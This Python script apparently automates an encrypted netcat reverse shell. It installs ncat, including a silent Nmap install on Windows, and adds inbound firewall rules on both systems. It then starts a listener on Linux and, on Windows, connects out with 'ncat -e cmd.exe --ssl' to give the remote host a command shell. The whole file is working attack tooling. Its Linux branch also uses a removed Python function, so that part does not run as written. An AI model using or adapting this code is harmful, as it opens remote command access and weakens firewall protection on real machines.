import os
import platform
import subprocess
import socket
import sys

def check_nc_installed():
    """Check if ncat (netcat) is installed and supports SSL."""
    try:
        result = subprocess.run(['ncat', '--version'], capture_output=True, text=True)
        if "Ncat: Version" in result.stdout:
            print("[+] Ncat is installed!")
            return True
        else:
            print("[-] Ncat is not installed or doesn't support SSL. Attempting installation...")
            return False
    except FileNotFoundError:
        print("[-] Ncat (Netcat) is not installed. Attempting installation...")
        return False

def install_ncat():
    """Install ncat on the respective OS."""
    system = platform.system().lower()
    
    if 'linux' in system:
        # Install ncat using the package manager on Linux
        distro = platform.linux_distribution()[0].lower()
        if 'ubuntu' in distro or 'debian' in distro:
            print("[*] Installing ncat on Linux (Debian/Ubuntu)...")
            os.system("sudo apt update && sudo apt install -y ncat")
        elif 'centos' in distro or 'rhel' in distro:
            print("[*] Installing ncat on Linux (CentOS/RHEL)...")
            os.system("sudo yum install -y nmap-ncat")
        else:
            print("[-] Unsupported Linux distribution. Please install ncat manually.")
            sys.exit(1)
    elif 'windows' in system:
        # Download and install Nmap (which includes ncat) on Windows
        print("[*] Installing ncat on Windows (via Nmap)...")
        nmap_installer = "nmap-setup.exe"
        download_url = "https://nmap.org/dist/nmap-7.92-setup.exe"
        subprocess.run(["powershell.exe", f"Invoke-WebRequest -Uri {download_url} -OutFile {nmap_installer}"])
        subprocess.run([nmap_installer, "/S"])  # Silent install
        print("[+] Ncat installed on Windows.")
    else:
        print(f"[-] Unsupported OS: {system}. Please install ncat manually.")
        sys.exit(1)

def check_firewall(port):
    """Check and allow the specified port through the firewall."""
    system = platform.system().lower()
    
    if 'linux' in system:
        print("[*] Checking Linux firewall...")
        # Allow the port through iptables
        subprocess.run(['sudo', 'iptables', '-A', 'INPUT', '-p', 'tcp', '--dport', str(port), '-j', 'ACCEPT'])
        print(f"[+] Port {port} allowed through firewall on Linux.")
    elif 'windows' in system:
        print("[*] Checking Windows firewall...")
        # Use PowerShell to allow the port in Windows Firewall
        subprocess.run(['powershell.exe', f'New-NetFirewallRule -DisplayName "AllowPort{port}" -Direction Inbound -LocalPort {port} -Protocol TCP -Action Allow'], shell=True)
        print(f"[+] Port {port} allowed through firewall on Windows.")
    else:
        print(f"[-] Unsupported OS: {system}. Cannot configure the firewall.")

def get_windows_ip():
    """Retrieve the IP address of the Windows machine."""
    hostname = socket.gethostname()
    ip_address = socket.gethostbyname(hostname)
    print(f"[+] The Windows machine's IP address is: {ip_address}")
    return ip_address

def start_netcat_listener(port, windows_ip):
    """Start the netcat listener on the Linux machine."""
    command = f"sudo ncat -nvlp {port} --allow {windows_ip} --ssl"
    print(f"[*] Starting netcat listener with command: {command}")
    os.system(command)

def connect_netcat_reverse_shell(linux_ip, port):
    """Connect to the Linux listener from Windows machine."""
    system = platform.system().lower()

    if 'windows' in system:
        command = f"ncat -nv {linux_ip} {port} -e cmd.exe --ssl"
        print(f"[*] Connecting to Linux listener with command: {command}")
        os.system(command)
    else:
        print("[-] This function is intended for Windows systems only.")

def main():
    port = input("[*] Enter the port number you want to use: ")
    linux_ip = input("[*] Enter the Linux IP address: ")

    # Step 1: Check if ncat is installed; if not, install it
    if not check_nc_installed():
        install_ncat()

    # Step 2: Get the Windows machine's IP address
    windows_ip = get_windows_ip()

    # Step 3: Check and allow port through firewall
    check_firewall(port)

    # Step 4: Determine if running on Linux or Windows and take appropriate action
    system = platform.system().lower()

    if 'linux' in system:
        print("[*] Linux system detected. Preparing to start listener...")
        start_netcat_listener(port, windows_ip)
    elif 'windows' in system:
        print("[*] Windows system detected. Preparing to connect to reverse shell...")
        connect_netcat_reverse_shell(linux_ip, port)
    else:
        print("[-] Unsupported OS detected. This script is for Linux and Windows only.")

if __name__ == "__main__":
    main()